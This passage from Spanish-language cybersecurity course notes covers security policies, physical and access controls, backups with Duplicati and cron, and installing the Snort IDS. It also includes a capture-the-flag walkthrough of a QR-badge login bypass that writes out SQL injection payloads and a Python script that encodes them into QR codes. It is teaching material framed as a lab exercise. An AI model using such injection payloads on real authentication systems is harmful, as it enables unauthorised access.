| -------------------------------------- | -------------------------------- | ------------------------------------------------ |
| **Pol√≠tica de contrase√±as**            | Cuentas de usuario               | M√≠nimo 8 caracteres, cambiar cada 90 d√≠as.       |
| **Pol√≠tica de acceso**                 | Recursos f√≠sicos o digitales     | Solo el personal de TI puede entrar al servidor. |
| **Pol√≠tica de uso aceptable**          | Internet, software, dispositivos | No descargar pel√≠culas en equipos del trabajo.   |
| **Pol√≠tica de respaldo**               | Datos                            | Hacer backup semanal de la base de datos.        |
| **Pol√≠tica de respuesta a incidentes** | C√≥mo actuar ante ataques         | Si hay malware, desconectar equipo y avisar.     |

---

### üìå 3. Seguridad f√≠sica

La **seguridad f√≠sica** protege **el lugar donde est√°n los datos, servidores, equipos o personas**.

#### üîí Ejemplos f√°ciles:

- Cerraduras en los racks de servidores.
- C√°maras de vigilancia.
- Tarjetas magn√©ticas para entrar.
- Guardias de seguridad.
- Alarmas contra incendios o robos.

> üß† No sirve tener un firewall si cualquiera puede entrar y robar tu computadora.

---

### üìå 4. Controles de acceso

Los **controles de acceso** determinan **qui√©n puede entrar a un lugar f√≠sico o acceder a datos digitales**.

#### üîê Tipos de controles:

| Tipo           | Ejemplo f√≠sico                    | Ejemplo l√≥gico (digital)                          |
| -------------- | --------------------------------- | ------------------------------------------------- |
| **Preventivo** | Puerta con tarjeta                | Contrase√±a y autenticaci√≥n 2FA                    |
| **Detectivo**  | C√°maras o alarmas                 | Logs de acceso y alertas                          |
| **Correctivo** | Guardia que responde al incidente | Sistema que bloquea cuenta tras intentos fallidos |

---

### üõ†Ô∏è ¬øC√≥mo se "instala" esto? (Implementaci√≥n real)

**Instalar controles de acceso y seguridad f√≠sica** significa **adoptar herramientas, pr√°cticas y normas**.

#### üîß Ejemplos:

- Instalar **una cerradura con lector de huella digital** en la sala de servidores.
- Configurar en un sistema que los usuarios **no puedan acceder fuera de su horario laboral**.
- Aplicar **software de control de acceso** como:

  - **Active Directory (Windows)**: Para dar o negar acceso a carpetas, redes o recursos.
  - **FreeIPA o LDAP (Linux)**: Para controlar el acceso a nivel de dominio.

---

### üß™ EJEMPLO COMPLETO (SENCILLO)

**Escenario:**
Una empresa peque√±a quiere proteger su sala de servidores y sus datos.

---

#### ‚úÖ Paso 1: Pol√≠ticas escritas

Se define:

- Solo el equipo de TI puede ingresar al cuarto de servidores.
- La puerta del servidor debe estar cerrada con cerradura digital.
- El acceso remoto al sistema se permite solo desde IPs autorizadas.
- Se debe registrar todo ingreso f√≠sico y digital.

---

#### ‚úÖ Paso 2: Seguridad f√≠sica

Se instala:

- Cerradura con huella digital en la sala del servidor.
- C√°mara en la entrada.
- UPS para proteger cortes el√©ctricos.
- Sensor de humo.

---

#### ‚úÖ Paso 3: Controles de acceso

##### A nivel f√≠sico:

- El t√©cnico de TI **Juan P√©rez** tiene permiso de acceso con su huella.

##### A nivel l√≥gico:

- En Active Directory:

  - Juan accede a la carpeta `\\Servidor\TI\Backups`
  - El personal de contabilidad **no** puede acceder ah√≠.

---

#### ‚úÖ Paso 4: Prueba

Juan entra al cuarto con su huella ‚ûù acceso permitido.
Ana de contabilidad intenta ingresar ‚ûù acceso denegado.

Juan intenta entrar a su carpeta desde su laptop en casa ‚ûù bloqueado (su IP no es permitida).

---

#### ‚úÖ Paso 5: Auditor√≠a

- La c√°mara graba cada entrada.
- Los logs del sistema muestran qui√©n accedi√≥, cu√°ndo y desde d√≥nde.
- Si algo falla, el equipo revisa pol√≠ticas y aplica correctivos.

---

### üõ°Ô∏è Conclusi√≥n:

| Elemento            | Importancia                             |
| ------------------- | --------------------------------------- |
| Pol√≠ticas escritas  | Define reglas claras y evita confusi√≥n  |
| Seguridad f√≠sica    | Protege tus activos f√≠sicos             |
| Controles de acceso | Evita accesos indebidos                 |
| Auditor√≠a           | Detecta incidentes y permite investigar |

---

[üîº](#√≠ndice)

---

## **890. Pr√°ctica: Bypass autenticaci√≥n QR (Reto 6 SANS Holiday hack)**

### üßê ¬øQu√© implica este reto?

- Se trata de una **autenticaci√≥n por QR** (como una tarjeta de acceso).
- Se detect√≥ que el sistema probablemente sufre de **inyecci√≥n SQL** al procesar el contenido del QR.
- El objetivo es **manipular el valor del QR** para forzar el sistema a autenticarte.

---

### ‚öôÔ∏è ¬øQu√© necesitas para practicar?

| Elemento            | Descripci√≥n                                                   |
| ------------------- | ------------------------------------------------------------- |
| Ambiente controlado | M√°quina virtual local con entorno web o emulador de SANS      |
| Herramientas        | Generador de QR (web o script Python con `qrcode`), navegador |
| Entorno offline     | Evita hacer pruebas en sistemas reales sin permiso            |

---

### üõ†Ô∏è Instalaci√≥n / Preparaci√≥n del entorno

1. **Entorno local**:

   - Puedes recrear un formulario HTTP que reciba una imagen QR.
   - Alternativamente, simula el reto con un peque√±o servidor que lea el contenido del QR y lo pase a una consulta SQL (por ejemplo, en Python o PHP).

2. **Generador de c√≥digos QR**:

   - Puedes usar sitios como [the-qrcode-generator.com](https://www.the-qrcode-generator.com/) o instalar Python:

     ```bash
     pip install qrcode requests
     ```

3. **Captura del permiso inicial**:

   - Lee el QR de ejemplo (como `oRfjg5uGHmbduj2m`) usando un decoder como [zxing.org](https://zxing.org/w/decode.jspx).

---

### üß™ EJEMPLO COMPLETO: Bypass de autenticaci√≥n QR con inyecci√≥n SQL

#### üîç Paso 1: Analizar el valor del QR original

- Se decodifica: `oRfjg5uGHmbduj2m` ([Medium][1], [InfosecETC][2], [Platzi][3])
- Esto revela que el sistema simplemente toma ese valor para buscar en la tabla `employees`:

  ```sql
  SELECT first_name,last_name,enabled FROM employees WHERE authorized = 1 AND uid = '<valor>' LIMIT 1;
  ```

---

#### üöß Paso 2: Probar inyecci√≥n b√°sica

Agrega comilla simple para generar error SQL:

```
oRfjg5uGHmbduj2m'
```

El sistema responde:

```
SQL syntax error
```

Esto confirma que el campo es vulnerable ([InfosecETC][2], [Platzi][3])

---

#### üß† Paso 3: Bypass b√°sico con OR 1=1

Genera un QR con:

```
oRfjg5uGHmbduj2m' OR '1'='1
```

Respuesta:

```
Authorized User Account Has Been Disabled
```

Esto significa que la funci√≥n login pas√≥ la condici√≥n, pero marc√≥ `enabled = false` ([Medium][1], [InfosecETC][2])

---

#### üéØ Paso 4: Injerto final para acceso

Se construy√≥ un payload que fuerza `enabled = '1'`:

```
oRfjg5uGHmbduj2m' OR '1'='1' AND enabled = '1
```

Genera un nuevo QR con ese valor codificado.
¬°El panel dice:
**"User Access Granted - Control number 19880715"**!
Ese es el n√∫mero de control final ([InfosecETC][2])

---

### üìù Script Python de ejemplo (opcional)

```python
import qrcode

payload = "oRfjg5uGHmbduj2m' OR '1'='1' AND enabled = '1"
qr = qrcode.make(payload)
qr.save("bypass_qr.png")
print("QR generado con payload:", payload)
```

Luego env√≠a `bypass_qr.png` al sistema simulador o WebForm local para procesarlo.

---

### üìã Resumen del flujo

| Paso             | Acci√≥n                        | Resultado esperado                       |
| ---------------- | ----------------------------- | ---------------------------------------- |
| Escaneo QR       | Decodificar el valor base     | `oRfjg5uGHmbduj2m`                       |
| Inyecci√≥n b√°sica | Agregar `'` al final          | Error SQL                                |
| Bypass parcial   | `' OR '1'='1`                 | Usuario encontrado, pero deshabilitado   |
| Bypass final     | `' OR '1'='1' AND enabled='1` | Acceso concedido, muestra control number |

---

### ‚úÖ Conclusi√≥n

- El reto combina **ingenier√≠a inversa de un sistema de autenticaci√≥n** con **inyecci√≥n SQL dentro de un QR**.
- Se resolvi√≥ manipulando el contenido del QR para forzar l√≥gica positiva y condici√≥n `enabled = '1'`.
- Ejemplo f√°cil de entender y replicar en laboratorio local con Python o servidor de prueba.

[1]: https://medium.com/%40christoferdirk/the-2018-sans-holiday-hack-challenge-objective-6-162cda2b2816?utm_source=chatgpt.com "The 2018 SANS Holiday Hack Challenge: Objective 6 - Medium"
[2]: https://infosecetc.github.io/hhc18/Objectives/6-badge.html?utm_source=chatgpt.com "Badge Manipulation - 2018 SANS Holiday Hack Challenge Solution"
[3]: https://platzi.com/cursos/ethical-hacking/practica-bypass-autenticacion-qr-reto-6-sans-holid/?utm_source=chatgpt.com "Resoluci√≥n de Retos de Seguridad en San Holidays Challenge"

---

[üîº](#√≠ndice)

---

## **891. Copias de seguridad. Defensa en lo profundo**

### üõ°Ô∏è ¬øQu√© es ‚ÄúDefensa en profundidad‚Äù?

La **Defensa en profundidad** (Defence in Depth) es una **estrategia de seguridad cibern√©tica** que no depende de una √∫nica capa de defensa. En lugar de eso, usa **m√∫ltiples capas de protecci√≥n** para minimizar el riesgo de un ataque exitoso.

#### üîê Ejemplo sencillo:

Imagina que quieres proteger tu casa. ¬øQu√© har√≠as?

1. Pones **puertas con cerradura**.
2. Agregas una **reja**.
3. Instalas **c√°maras de seguridad**.
4. Contratas un **vigilante**.
5. Guardas lo m√°s valioso en una **caja fuerte**.

‚û°Ô∏è **Eso es defensa en profundidad.**

En el mundo digital:

| Capa                | Ejemplo                                     |
| ------------------- | ------------------------------------------- |
| Per√≠metro           | Firewall, router seguro                     |
| Red                 | VLAN, IDS/IPS                               |
| Aplicaciones        | Autenticaci√≥n, actualizaciones              |
| Dispositivos        | Antivirus, cifrado de disco                 |
| Usuario final       | Educaci√≥n, contrase√±as seguras              |
| Copias de seguridad | Backups para restaurar en caso de incidente |

---

### üíæ ¬øQu√© son las copias de seguridad?

Una **copia de seguridad (backup)** es una **r√©plica de los datos importantes** que se almacena en un lugar seguro. Si hay un ataque (por ejemplo, ransomware), p√©rdida accidental o fallo de hardware, puedes **recuperar la informaci√≥n**.

---

#### üîÅ Tipos de copia de seguridad

| Tipo               | Descripci√≥n breve                                               |
| ------------------ | --------------------------------------------------------------- |
| Completa           | Copia total de todos los archivos. Lenta pero confiable.        |
| Incremental        | Solo copia lo que ha cambiado desde el √∫ltimo backup. R√°pida.   |
| Diferencial        | Copia lo que cambi√≥ desde el √∫ltimo backup completo.            |
| Imagen del sistema | Copia exacta del disco completo (incluye el sistema operativo). |

---

#### üß† Ejemplo pr√°ctico de respaldo

Sup√≥n que eres due√±o de una tienda y todos los d√≠as guardas tus ventas en un archivo llamado `ventas.xlsx`. Si un d√≠a tu computadora se da√±a, y no tienes backup, **pierdes todo**.

Ahora imagina que haces una copia diaria de ese archivo en Google Drive y otra en un disco externo. Entonces, **aunque te hackeen o se borre todo, tienes c√≥mo restaurarlo**.

---

### üõ†Ô∏è ¬øC√≥mo se instala un sistema de backup?

#### Opci√≥n 1: Usar **Duplicati** (Windows, Linux, Mac)

**Duplicati** es gratuito, encriptado y f√°cil de usar.

##### Instalaci√≥n (Windows o Linux)

1. Ve a: [https://www.duplicati.com/download](https://www.duplicati.com/download)
2. Instala el programa.
3. Abre el panel web.
4. Crea una nueva copia de seguridad:

   - Selecciona los archivos o carpetas.
   - Elige destino: disco externo, FTP, Google Drive, Dropbox, etc.
   - Programa: todos los d√≠as a las 9 p.m.
   - Encripta con una contrase√±a fuerte.

5. ¬°Listo! Duplicati har√° copias autom√°ticas.

---

#### Opci√≥n 2: Copia de seguridad simple con script en Linux

```bash
#!/bin/bash
# Backup de la carpeta /home/gustavo
fecha=$(date +%Y-%m-%d)
tar -czvf /backups/home_backup_$fecha.tar.gz /home/gustavo
```

Gu√°rdalo como `backup.sh`, dale permisos:

```bash
chmod +x backup.sh
```

Y agr√©galo al cron:

```bash
crontab -e
# Ejecutar todos los d√≠as a las 2:00 a.m.
0 2 * * * /ruta/backup.sh
```

---

### ‚úÖ Ejemplo completo paso a paso

#### üéØ Objetivo: Proteger tus archivos personales con copia autom√°tica diaria a Google Drive.

#### Paso 1: Instalar Duplicati

- Descarga desde [https://www.duplicati.com/download](https://www.duplicati.com/download)
- Instala y abre en navegador `http://localhost:8200/`

#### Paso 2: Crear una tarea de backup

- Nombre: "Backup documentos"
- Origen: `C:\Users\TuNombre\Documents`
- Destino: Google Drive (inicia sesi√≥n con tu cuenta)
- Encriptaci√≥n: habilitada
- Frecuencia: diaria a las 10:00 PM
- ¬°Iniciar tarea!

#### Paso 3: Probar restauraci√≥n

- Borra un archivo de prueba.
- Desde Duplicati: Restaurar ‚Üí seleccionar archivo ‚Üí restaurar ubicaci√≥n.

¬°Archivo recuperado sin p√©rdidas!

---

### üß† ¬øC√≥mo encajan los backups en la defensa en profundidad?

Las copias de seguridad son tu **√∫ltima l√≠nea de defensa**:

- Un firewall puede fallar.
- El antivirus puede no detectar un ransomware.
- Pero **una copia de seguridad offline o en la nube puede salvarte de perder los datos**.

Por eso siempre deben formar parte de una estrategia de **defensa en profundidad**.

---

### üìå Conclusi√≥n

- ‚úÖ **Copias de seguridad** = protecci√≥n contra errores, ataques y accidentes.
- ‚úÖ **Defensa en profundidad** = m√∫ltiples capas de seguridad.
- ‚úÖ Combinar ambas es una **mejor pr√°ctica profesional** en ciberseguridad.

---

[üîº](#√≠ndice)

---

## **892. Pr√°ctica: instalaci√≥n del IDS snort**

### üîç ¬øQu√© es Snort?

**Snort** es un **IDS (Sistema de Detecci√≥n de Intrusos)** que analiza el tr√°fico de red en tiempo real y detecta posibles ataques o comportamientos maliciosos. Puede usarse tambi√©n como **IPS (Sistema de Prevenci√≥n de Intrusos)** si se configura para bloquear tr√°fico.

---

### üß† Ejemplo f√°cil de entender

Imagina que tu red es una casa y Snort es un **perro guardi√°n entrenado** para olfatear y ladrar si detecta algo sospechoso como una ventana rota o una puerta forzada.

- Si alguien intenta entrar sin permiso ‚Üí **Snort "ladra" (alerta)**.
- Si tienes activado el IPS ‚Üí **Snort "muerde" (bloquea el acceso)**.

---

### üß± ¬øC√≥mo funciona Snort?

Snort detecta amenazas con tres m√©todos:

1. **Basado en firmas**: como un antivirus, detecta patrones conocidos.
2. **Basado en protocolo**: detecta desviaciones del comportamiento normal.
3. **Basado en anomal√≠as**: identifica tr√°fico inusual.

---

### üß∞ ¬øQu√© necesito para instalar Snort?

Puedes instalar Snort en:

- Kali Linux üêç (muy recomendado)
- Ubuntu / Debian
- Windows (no es lo ideal para producci√≥n)

Aqu√≠ usaremos **Kali Linux** o **Ubuntu**.

---

### üß™ Instalaci√≥n de Snort en Kali Linux o Ubuntu

#### Paso 1: Actualiza tu sistema

```bash
sudo apt update && sudo apt upgrade -y
```

#### Paso 2: Instala dependencias

```bash
sudo apt install -y build-essential libpcap-dev libpcre3-dev libdumbnet-dev bison flex zlib1g-dev liblzma-dev openssl libssl-dev
```

#### Paso 3: Descarga e instala DAQ (Data Acquisition Library)

```bash
cd /tmp
wget https://www.snort.org/downloads/snort/daq-2.0.7.tar.gz
tar -xvzf daq-2.0.7.tar.gz
cd daq-2.0.7
./configure && make && sudo make install
```

#### Paso 4: Descarga e instala Snort

```bash
cd /tmp
wget https://www.snort.org/downloads/snort/snort-2.9.20.tar.gz
tar -xvzf snort-2.9.20.tar.gz
cd snort-2.9.20
./configure --enable-sourcefire && make && sudo make install
```

#### Paso 5: Verifica instalaci√≥n

```bash
snort -V
```

Debe mostrar algo como:
`Snort version 2.9.20`

---

### üóÇÔ∏è Configuraci√≥n b√°sica

#### Paso 6: Crear estructura de carpetas

```bash
sudo mkdir -p /etc/snort/rules
sudo mkdir /var/log/snort
sudo mkdir /usr/local/lib/snort_dynamicrules
```

#### Paso 7: Copiar archivos de configuraci√≥n

```bash
sudo cp etc/* /etc/snort/
```

#### Paso 8: Crear una regla de ejemplo

Edita el archivo `local.rules`:

```bash
sudo nano /etc/snort/rules/local.rules
```

Agrega:

```snort
alert icmp any any -> any any (msg:"ICMP packet detected"; sid:1000001;)
```

Esta regla detecta cualquier paquete ICMP (como un ping) y lanza una alerta.

---

### üß™ Ejemplo completo: Detectar un "ping" con Snort

#### 1. Iniciar Snort en modo alerta

```bash
sudo snort -A console -q -u snort -g snort -c /etc/snort/snort.conf -i eth0
```

> Aseg√∫rate de que `eth0` sea tu interfaz de red. Usa `ip a` o `ifconfig` para verificar.

#### 2. Desde otro equipo o terminal, haz un ping a la m√°quina:

```bash
ping <IP_de_la_m√°quina_con_Snort>
```

#### 3. Ver√°s en la consola:

```bash
[**] [1:1000001:0] ICMP packet detected [**]
```

üéâ ¬°Snort detect√≥ el tr√°fico ICMP! Ya tienes funcionando un IDS b√°sico.

---

### üìå Notas importantes

- Puedes usar **Snort Rules Community** desde [https://www.snort.org/downloads](https://www.snort.org/downloads) para reglas m√°s avanzadas.
- Snort puede trabajar en modo **pasivo (detecci√≥n)** o **activo (prevenci√≥n)**.
- Puedes integrarlo con **PulledPork** o **Barnyard2** para automatizar y centralizar alertas.

---

### üß† ¬øQu√© aprendiste?

| Concepto       | Explicaci√≥n sencilla                                   |
| -------------- | ------------------------------------------------------ |
| IDS            | Sistema que **detecta intrusiones** en tu red          |
| Snort          | Herramienta libre para implementar un IDS              |
| Regla en Snort | Patr√≥n que indica a Snort qu√© buscar                   |
| Instalaci√≥n    | Kali o Ubuntu recomendado, requiere dependencias y DAQ |
| Ejemplo        | Snort alerta cuando detecta un **ping (ICMP)**         |

---

[üîº](#√≠ndice)

---

| **Inicio**         | **atr√°s 12**                                | **Siguiente 14**                                    |
| ------------------ | ------------------------------------------- | --------------------------------------------------- |
| [üè†](../README.md) | [‚è™](./7_12_Fundamentos_de_Criptografia.md) | [‚è©](./7_14_Inteligencia_para_la_Ciberseguridad.md) |
